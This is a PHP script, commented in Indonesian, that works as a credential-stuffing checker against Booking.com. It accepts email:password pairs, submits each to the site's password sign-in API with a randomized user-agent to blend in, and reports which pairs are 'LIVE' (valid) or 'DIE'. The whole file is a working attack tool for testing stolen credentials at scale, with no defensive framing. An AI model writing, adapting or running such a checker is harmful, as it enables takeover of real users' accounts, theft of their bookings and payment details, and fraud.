<?php
// Fungsi untuk menghasilkan user-agent secara acak
function generateRandomUserAgent() {
    // Daftar kemungkinan nilai untuk setiap bagian dari user-agent
    $platforms = array(
        'Windows NT 10.0', // Windows 10
        'Windows NT 6.3',  // Windows 8.1
        'Windows NT 6.2',  // Windows 8
        'Windows NT 6.1',  // Windows 7
        'Windows NT 6.0',  // Windows Vista
        'Windows NT 5.1',  // Windows XP
        'Macintosh; Intel Mac OS X 10_15_7', // Mac OS X
        'Macintosh; Intel Mac OS X 10_14_6', // Mac OS X
        'X11; Linux x86_64', // Linux
        'X11; Ubuntu; Linux x86_64', // Ubuntu Linux
        'X11; Fedora; Linux x86_64' // Fedora Linux
    );

    $browsers = array(
        'AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36', // Chrome
        'AppleWebKit/537.36 (KHTML, like Gecko) Firefox/96.0', // Firefox
        'AppleWebKit/537.36 (KHTML, like Gecko) Safari/537.36', // Safari
        'AppleWebKit/537.36 (KHTML, like Gecko) Edge/96.0.1054.62', // Microsoft Edge
        'AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.45 Mobile Safari/537.36', // Mobile Safari
    );

    $platform = $platforms[array_rand($platforms)]; // Pilih secara acak platform
    $browser = $browsers[array_rand($browsers)]; // Pilih secara acak browser

    // Gabungkan platform dan browser menjadi user-agent
    $userAgent = "Mozilla/5.0 ($platform) $browser";

    return $userAgent;
}

// Gunakan fungsi untuk menghasilkan user-agent secara acak
$userAgent = generateRandomUserAgent();

// Ambil data dari input stream sebagai JSON
$data = file_get_contents('php://input');
// Decode data JSON menjadi array asosiatif
$request = json_decode($data, true);

if ($_SERVER["REQUEST_METHOD"] == "POST" && isset($request['credentials'])) {
    // Ambil nilai dari credentials
    $credentials = $request['credentials'];

    // Pisahkan nilai email dan password
    list($email, $password) = explode(':', $credentials);

    // Lakukan permintaan cURL dengan nilai email dan password yang didapat
    $curl = curl_init();

    curl_setopt_array($curl, array(
      CURLOPT_URL => 'https://account.booking.com/api/identity/authenticate/v1.0/sign_in/password/submit',
      CURLOPT_RETURNTRANSFER => true,
      CURLOPT_ENCODING => '',
      CURLOPT_MAXREDIRS => 10,
      CURLOPT_TIMEOUT => 0,
      CURLOPT_FOLLOWLOCATION => true,
      CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
      CURLOPT_CUSTOMREQUEST => 'POST',
      CURLOPT_POSTFIELDS =>'{
        "context": {
          "value": ""
        },
        "identifier": {
          "type": "IDENTIFIER_TYPE__EMAIL",
          "value": "' . $email . '"
        },
        "authenticator": {
          "type": "AUTHENTICATOR_TYPE__PASSWORD",
          "value": "' . $password . '"
        }
      }',
      CURLOPT_HTTPHEADER => array(
        'User-Agent: ' . $userAgent,
        'X-Booking-Client: ap',
        'X-Requested-With: XMLHttpRequest',
        'Content-Type: application/json',
        'Cookie: '
      ),
    ));

    $response = curl_exec($curl);

    curl_close($curl);

    // Parse respons JSON
    $responseData = json_decode($response, true);

    // Cek apakah respons memiliki 'context' atau 'error'
    if (isset($responseData['context'])) {
        $nextStep = $responseData['context'];
        $response = "LIVE || $email:$password";
    } elseif (isset($responseData['error'])) {
        $errorDetails = $responseData['error'][0]['errorDetails'];
        $response = "DIE || $email:$password";
    } else {
        $response = "RECHECK || $email:$password";
    }

    echo $response;
}
?>
